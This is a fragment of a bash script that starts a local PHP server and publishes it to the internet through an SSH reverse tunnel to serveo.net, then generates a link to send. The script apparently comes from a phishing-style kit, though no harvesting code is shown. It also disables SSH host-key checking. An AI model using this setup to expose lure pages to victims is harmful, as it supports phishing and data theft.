...
default_subdomain="serveo.net"
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a subdomain? \e[0m\e[1;77m[Y/n]: \e[0m"
read -p "" choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "y" || $choose_sub == "Y" ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter subdomain: \e[0m' subdomain
if [[ $subdomain == "" ]]; then
...
printf "\n\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
if [[ $choose_sub == "y" || $choose_sub == "Y" ]]; then
printf "\n\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
printf "\n\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Generating link...\e[0m\n"
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
sleep 8
else
printf "\n\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
